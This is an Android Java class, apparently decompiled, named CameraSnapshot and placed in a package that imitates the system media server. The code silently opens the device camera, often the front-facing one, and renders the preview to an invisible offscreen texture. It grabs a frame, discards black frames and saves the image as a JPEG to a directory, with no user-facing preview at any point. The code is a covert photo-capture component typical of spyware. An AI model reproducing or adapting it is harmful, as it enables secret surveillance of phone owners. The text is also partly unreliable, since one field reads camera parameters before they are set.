package com.android.mediaserver.camera;

import android.annotation.TargetApi;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.ErrorCallback;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PreviewCallback;
import android.hardware.Camera.Size;
import android.opengl.GLES20;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Hashtable;
import java.util.List;
import timber.log.Timber;

public class CameraSnapshot {
  public static final int CAMERA_ANY = -1;
  private static final String TAG = "CameraSnapshot";
  private static CameraSnapshot singleton = null;
  public Object cameraLock = new Object();
  private Hashtable<Integer, Boolean> enable = new Hashtable();
  private ErrorCallback errorCallback = new ErrorCallback() {
    public void onError(int error, Camera camera) {
      Log.d(CameraSnapshot.TAG, " (onError), Error: " + error);
      if (error == 100) {
        Log.d(CameraSnapshot.TAG, " (onError), Error: CAMERA_ERROR_SERVER_DIED");
      } else if (error == 1) {
        Log.d(CameraSnapshot.TAG, " (onError), Error: CAMERA_ERROR_UNKNOWN");
      }
    }
  };
  private String mOutputDirectory;
  private CameraHandlerThread mThread = null;
  private PreviewCallback previewCallback = new PreviewCallback() {

    public void onPreviewFrame(byte[] bytes, Camera camera) {
      boolean released = false;
      if (bytes != null) {
        try {
          Timber.d("(onPreviewFrame), size: " + bytes.length, new Object[0]);
          AnonymousClass1CCD decodeCameraFrame = new AnonymousClass1CCD(bytes, camera);
          released = CameraSnapshot.this.releaseCamera(camera);
          new Thread(decodeCameraFrame).start();
        } catch (Throwable th) {
          if (!released) {
            try {
              CameraSnapshot.this.releaseCamera(camera);
            } catch (Exception e) {
              Timber.d("(onPreviewFrame) probably release called twice: " + e, new Object[0]);
            }
          }
          synchronized (CameraSnapshot.this.cameraLock) {
            CameraSnapshot.this.cameraLock.notifyAll();
          }
        }
      }
      if (!released) {
        try {
          CameraSnapshot.this.releaseCamera(camera);
        } catch (Exception e2) {
          Timber.d("(onPreviewFrame) probably release called twice: " + e2, new Object[0]);
        }
      }
      synchronized (CameraSnapshot.this.cameraLock) {
        CameraSnapshot.this.cameraLock.notifyAll();
      }
    }

    class AnonymousClass1CCD implements Runnable {
      byte[] bytes;
      Parameters cameraParms;
      Size size = this.cameraParms.getPreviewSize();

      AnonymousClass1CCD(byte[] b, Camera c) {
        this.bytes = b;
        this.cameraParms = c.getParameters();
      }

      public void run() {
        Timber.d("(CCD), size: " + this.bytes.length, new Object[0]);
        try {
          if (CameraSnapshot.this.isBlack(this.bytes)) {
            Timber.d("(CCD), BLACK", new Object[0]);
          } else if (this.cameraParms.getPreviewFormat() == 17) {
            ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
            YuvImage image = new YuvImage(this.bytes, 17, this.size.width, this.size.height, null);
            image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, jpeg);
            Timber.d("Preparing to save image!!", new Object[0]);
            String path = CameraSnapshot.this.mOutputDirectory + File.separator + (String.valueOf(
                System.currentTimeMillis()) + ".jpg");
            File file = new File(path);
            if (!file.exists()) {
              file.createNewFile();
            }
            new FileOutputStream(path).write(jpeg.toByteArray());
          }
        } catch (Exception e) {
          Timber.d("(CCD), error decoding frame: " + this.bytes.length, new Object[0]);
        }
      }
    }
  };
  private SurfaceTexture surface;

  private CameraSnapshot(String outputDirectory) {
    this.mOutputDirectory = outputDirectory;
  }

  public static CameraSnapshot self(String outputDirectory) {
    if (singleton == null) {
      singleton = new CameraSnapshot(outputDirectory);
    }
    return singleton;
  }

  @TargetApi(18) private static void choosePreviewSize(Parameters parms, int width, int height) {
    Size best = getMaximumQualityPreviewSize(parms);
    if (best != null) {
      Timber.d("(choosePreviewSize), Camera best preview size for video is "
          + best.width
          + "x"
          + best.height, new Object[0]);
    }
    if (best != null) {
      Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
      parms.setPreviewSize(best.width, best.height);
    }
  }

  private static Size getMaximumQualityPreviewSize(Parameters parameters) {
    List<Size> sizeList = parameters.getSupportedPreviewSizes();
    Size bestSize = null;
    for (int i = 1; i < sizeList.size(); i++) {
      int areaBest;
      Timber.d("(getBestPreviewSize), supported size: "
          + ((Size) sizeList.get(i)).width
          + " x "
          + ((Size) sizeList.get(i)).height, new Object[0]);
      int area = ((Size) sizeList.get(i)).width * ((Size) sizeList.get(i)).height;
      if (bestSize != null) {
        areaBest = bestSize.width * bestSize.height;
      } else {
        areaBest = 0;
      }
      if (area > areaBest) {
        bestSize = (Size) sizeList.get(i);
      }
    }
    return bestSize;
  }

  private Camera newOpenCamera(int given_cameraId, int given_encWidth, int given_encHeight) {
    Camera openCamera;
    if (this.mThread == null) {
      this.mThread = new CameraHandlerThread();
    }
    synchronized (this.mThread) {
      openCamera = this.mThread.openCamera(given_cameraId, given_encWidth, given_encHeight);
    }
    return openCamera;
  }

  @TargetApi(18) public void snapshot(int cameraId) throws InterruptedException {
    if (!this.enable.containsKey(Integer.valueOf(cameraId)) || ((Boolean) this.enable.get(
        Integer.valueOf(cameraId))).booleanValue()) {
      synchronized (this.cameraLock) {
        try {
          Camera camera = newOpenCamera(cameraId, 640, 480);
          if (camera == null) {
            return;
          }
          Timber.d("(snapshot), cameraId: " + cameraId, new Object[0]);
          if (this.surface == null) {
            int[] surfaceparams = new int[1];
            GLES20.glGenTextures(1, surfaceparams, 0);
            GLES20.glBindTexture(3553, surfaceparams[0]);
            GLES20.glTexParameteri(3553, 10242, 33071);
            GLES20.glTexParameteri(3553, 10243, 33071);
            this.surface = new SurfaceTexture(surfaceparams[0]);
          }
          camera.setPreviewTexture(this.surface);
          camera.startPreview();
          Size size = camera.getParameters().getPreviewSize();
          camera.addCallbackBuffer(new byte[((size.width * 3) * size.height)]);
          camera.setPreviewCallbackWithBuffer(this.previewCallback);
          this.cameraLock.wait();
          Thread.sleep(500);
        } catch (Exception e) {
          Timber.d("(snapshot) ERROR: " + e, new Object[0]);
        }
      }
    }
  }

  @TargetApi(9) private Camera openCamera(int requestFace) {
    Camera cam = null;
    CameraInfo cameraInfo = new CameraInfo();
    int cameraCount = Camera.getNumberOfCameras();
    for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
      Camera.getCameraInfo(camIdx, cameraInfo);
      if (cameraInfo.facing == 1) {
        Timber.d("(openCamera), found FACE CAMERA", new Object[0]);
      }
      Timber.d("(openCamera), orientation: " + cameraInfo.orientation, new Object[0]);
      if (requestFace == cameraInfo.facing || requestFace == CAMERA_ANY) {
        try {
          if (requestFace == CAMERA_ANY) {
            cam = Camera.open();
          } else {
            cam = Camera.open(camIdx);
          }
          if (cam != null) {
            Timber.d("(openCamera), opened: " + camIdx, new Object[0]);
            return cam;
          }
        } catch (RuntimeException e) {
          Timber.d("(openCamera), Error: " + e, new Object[0]);
        }
      }
    }
    return cam;
  }

  private Camera prepareCamera(int cameraId, int encWidth, int encHeight) {
    try {
      Camera camera = openCamera(cameraId);
      if (camera == null) {
        Timber.d("(prepareCamera), cannot open camera: " + cameraId, new Object[0]);
        return null;
      }
      camera.setErrorCallback(this.errorCallback);
      Parameters cameraParms = camera.getParameters();
      if (cameraParms.getSupportedFocusModes().contains("continuous-picture")) {
        cameraParms.setFocusMode("continuous-picture");
      }
      if (cameraParms.getSupportedPreviewFormats().contains(Integer.valueOf(17))) {
        cameraParms.setPreviewFormat(17);
      }
      choosePreviewSize(cameraParms, encWidth, encHeight);
      camera.setParameters(cameraParms);
      Size size = cameraParms.getPreviewSize();
      Timber.d("(prepareCamera), Camera preview size is " + size.width + "x" + size.height,
          new Object[0]);
      return camera;
    } catch (Exception ex) {
      Timber.d("(prepareCamera), ERROR " + ex, new Object[0]);
      return null;
    }
  }

  private boolean isBlack(byte[] raw) {
    for (int i = 0; i < raw.length; i++) {
      if (raw[i] > (byte) 20) {
        Timber.d("(isBlack), it's not black: " + raw[i], new Object[0]);
        return false;
      }
    }
    return true;
  }

  private synchronized boolean releaseCamera(Camera camera) {
    if (camera != null) {
      camera.stopPreview();
      camera.release();
    }
    Timber.d("(releaseCamera), released", new Object[0]);
    return true;
  }

  private class CameraHandlerThread extends HandlerThread {
    Camera camera = null;
    Handler mHandler = null;

    CameraHandlerThread() {
      super("CameraHandlerThread");
      start();
      this.mHandler = new Handler(getLooper());
    }

    synchronized void notifyCameraOpened() {
      notify();
    }

    Camera openCamera(final int given_cameraId, final int given_encWidth,
        final int given_encHeight) {
      this.mHandler.post(new Runnable() {
        public void run() {
          CameraHandlerThread.this.camera =
              CameraSnapshot.this.prepareCamera(given_cameraId, given_encWidth, given_encHeight);
          CameraHandlerThread.this.notifyCameraOpened();
        }
      });
      try {
        wait();
      } catch (InterruptedException e) {
        Timber.d("wait was interrupted ERROR: " + e, new Object[0]);
      }
      return this.camera;
    }
  }
}
